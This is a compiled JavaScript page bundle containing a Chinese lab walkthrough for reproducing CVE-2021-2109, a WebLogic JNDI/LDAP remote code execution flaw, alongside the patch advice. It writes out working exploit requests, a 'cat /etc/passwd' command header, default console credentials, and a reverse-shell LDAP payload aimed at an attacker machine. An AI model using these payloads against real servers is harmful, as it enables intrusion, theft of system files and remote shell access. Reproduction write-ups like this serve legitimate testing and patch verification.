(window.webpackJsonp=window.webpackJsonp||[]).push([[133],{450:function(t,a,s){"use strict";s.r(a);var i=s(7),e=Object(i.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"💔-weblogic-ldap-远程代码执行"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#💔-weblogic-ldap-远程代码执行"}},[t._v("#")]),t._v(" 💔 Weblogic LDAP 远程代码执行")]),t._v(" "),a("h3",{attrs:{id:"_1-漏洞信息"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1-漏洞信息"}},[t._v("#")]),t._v(" 1）漏洞信息")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("漏洞名称")]),t._v(" "),a("th",[t._v("受影响组件")]),t._v(" "),a("th",[t._v("漏洞类型")]),t._v(" "),a("th",[t._v("漏洞编号")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("Weblogic LDAP 远程代码执行")]),t._v(" "),a("td",[a("a",{attrs:{href:"https://www.oracle.com/cn/java/weblogic/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Weblogic"),a("OutboundLink")],1)]),t._v(" "),a("td",[t._v("远程代码执行")]),t._v(" "),a("td",[t._v("CVE-2021-2109")])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("漏洞简介")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("Oracle官方发布了漏洞补丁，修了包括 CVE-2021-2109 Weblogic Server远程代码执行漏洞在内的多个高危严重漏洞。CVE-2021-2109 中，攻击者可构造恶意请求，造成JNDI注入，执行任意代码，从而控制服务器。"),a("br"),a("br"),a("p",[t._v("影响版本：")]),t._v("WebLogic 10.3.6.0.0"),a("br"),t._v("WebLogic 12.1.3.0.0"),a("br"),t._v("WebLogic 12.2.1.3.0"),a("br"),t._v("WebLogic 12.2.1.4.0"),a("br"),t._v("WebLogic 14.1.1.0.0")])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("参考链接")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[a("a",{attrs:{href:"http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html"}},[t._v("http://wiki.peiqi.tech/wiki/webserver/Weblogic/Weblogic%20LDAP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-2109.html")])]),a("li",[a("a",{attrs:{href:"https://cloud.tencent.com/developer/article/1797518"}},[t._v("https://cloud.tencent.com/developer/article/1797518")])])])])])])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("补丁及修复方案")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[a("ol",[a("li",[t._v("升级Weblogic Server运行环境的JDK版本")]),a("li",[t._v("升级官方安全补丁："),a("a",{attrs:{href:"https://www.oracle.com/security-alerts/cpujan2021.html"}},[t._v("https://www.oracle.com/security-alerts/cpujan2021.html")])])])])])])]),t._v(" "),a("h3",{attrs:{id:"漏洞环境"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞环境"}},[t._v("#")]),t._v(" 漏洞环境")]),t._v(" "),a("h4",{attrs:{id:"方案一"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方案一"}},[t._v("#")]),t._v(" 方案一")]),t._v(" "),a("p",[t._v("使用"),a("a",{attrs:{href:"https://github.com/vulhub/vulhub",target:"_blank",rel:"noopener noreferrer"}},[t._v("vulhub"),a("OutboundLink")],1),t._v("搭建漏洞环境"),a("b",[t._v("（14882的环境同样适用于CVE-2021-2109）")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("git clone https://github.com/vulhub/vulhub\ncd vulhub/weblogic/CVE-2020-14882\ndocker-compose up -d\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br")])]),a("p",[t._v("访问7001端口，可以看到以下页面"),a("b",[t._v("（还需要等待一会，因为weblogic需要加载console控制台）")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/01.png",alt:""}}),a("figcaption")]),t._v(" "),a("h4",{attrs:{id:"方案二"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#方案二"}},[t._v("#")]),t._v(" 方案二")]),t._v(" "),a("p",[t._v("使用"),a("a",{attrs:{href:"https://github.com/fofapro/vulfocus",target:"_blank",rel:"noopener noreferrer"}},[t._v("vulfocus"),a("OutboundLink")],1),t._v("搭建漏洞环境")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("docker pull vulfocus/weblogic-cve_2021_2109\ndocker run -itd -p 7001:7001 vulfocus/weblogic-cve_2021_2109\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("访问控制台页面，进行登录")]),t._v(" "),a("ul",[a("li",[t._v("账号：weblogic")]),t._v(" "),a("li",[t._v("密码：welcome1\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/11.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("h3",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("python3 vulcat.py -u <URL> -a weblogic -v cve-2021-2109\n\n# 注意, vulcat-v2.0.0版本及以上, 应使用以下命令\npython3 vulcat.py -u <URL> -v cve-2021-2109\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/02.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("在DNSLOG平台可以看到相应记录\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/03.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("如果想进一步利用漏洞，需要下载辅助工具：https://github.com/WhiteHSBG/JNDIExploit/\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/04.png",alt:""}}),a("figcaption")]),a("p"),t._v(" "),a("p",[t._v("运行JNDIExploit（需要提前安装java环境）")]),t._v(" "),a("ul",[a("li",[t._v("使用-i选项指定本地IP")]),t._v(" "),a("li",[t._v("默认监听1389和3456端口")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("java -jar JNDIExploit-1.4-SNAPSHOT.jar -i <IP>\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("运行JNDIExploit之后")]),t._v(" "),a("ul",[a("li",[t._v("复制漏洞信息中的Request数据包")]),t._v(" "),a("li",[t._v("放入Burp，修改LDAP的IP地址\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/05.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.80.132:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: http://192.168.80.132:7001\nOrigin: http://192.168.80.132:7001\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br")])]),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ldap://192.168.80;1:1389/Basic/WeblogicEcho\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("此处需要注意，CVE-2021-2109有一个特性")]),t._v(" "),a("ul",[a("li",[t._v("IP的最后一个.需要改为分号;")]),t._v(" "),a("li",[t._v("例如 192.168.1.1 --\x3e 192.168.1"),a("b",[t._v(";")]),t._v("1\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/07.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("p",[t._v("在Burp发送数据包之后，回到命令行，可以看到返回了记录")]),t._v(" "),a("ul",[a("li",[t._v("说明LDAP成功\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/08.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("GET /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.80;1:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1\nHost: 192.168.80.132:7001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nReferer: http://192.168.80.132:7001\nOrigin: http://192.168.80.132:7001\ncmd: cat /etc/passwd\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br"),a("span",{staticClass:"line-number"},[t._v("8")]),a("br"),a("span",{staticClass:"line-number"},[t._v("9")]),a("br"),a("span",{staticClass:"line-number"},[t._v("10")]),a("br")])]),a("p",[t._v("此时如果你想执行自定义命令，并获得回显")]),t._v(" "),a("ul",[a("li",[t._v("只需要在数据包中添加一个Headers")]),t._v(" "),a("li",[t._v("cmd: 你的命令")]),t._v(" "),a("li",[t._v("如图\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/09.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/10.png",alt:""}}),a("figcaption")]),t._v(" "),a("ul",[a("li",[a("b",[t._v("vulfocus：")]),t._v("\n由于vulfocus的镜像无法通过漏洞 绕过登录页面进后台\n所以需要提前登录，并在扫描时添加Cookie")])]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/12.png",alt:""}}),a("figcaption")]),t._v(" "),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/13.png",alt:""}}),a("figcaption")]),t._v(" "),a("h4",{attrs:{id:"额外内容-反弹shell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#额外内容-反弹shell"}},[t._v("#")]),t._v(" 额外内容-反弹shell")]),t._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/WhiteHSBG/JNDIExploit/",target:"_blank",rel:"noopener noreferrer"}},[t._v("JNDIExploit"),a("OutboundLink")],1),t._v("还支持反弹shell的功能")]),t._v(" "),a("ul",[a("li",[t._v("在一台"),a("b",[t._v("Linux")]),t._v("机器上运行ncat，如图")]),t._v(" "),a("li",[t._v("必须是Linux机器，Windows运行ncat无法获取反弹回来的shell（工具介绍是这样说的，复现时经过实验也发现Windows不行）\n"),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/14.png",alt:""}}),a("figcaption")])])]),t._v(" "),a("p",[t._v("然后发送Payload")]),t._v(" "),a("ul",[a("li",[t._v("我的JNDIExploit.jar运行在192.168.80.1，端口1389")]),t._v(" "),a("li",[t._v("ncat运行在192.168.80.132，端口12000")])]),t._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("ldap://<你的JNDI>/Basic/ReverseShell/<IP>/<PORT>\n\n# 示例：\nldap://192.168.80;1:1389/Basic/ReverseShell/192.168.80.132/12000\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br")])]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/15.png",alt:""}}),a("figcaption")]),t._v(" "),a("p",[t._v("回到ncat终端，可以看到已经返回了shell\n")]),a("figure",[a("img",{attrs:{src:"https://fastly.statically.io/gh/clincat/blog-imgs@main/hub/static/imgs/vulns/weblogic/cve-2021-2109/16.png",alt:""}}),a("figcaption")]),a("p")])}),[],!1,null,null,null);a.default=e.exports}}]);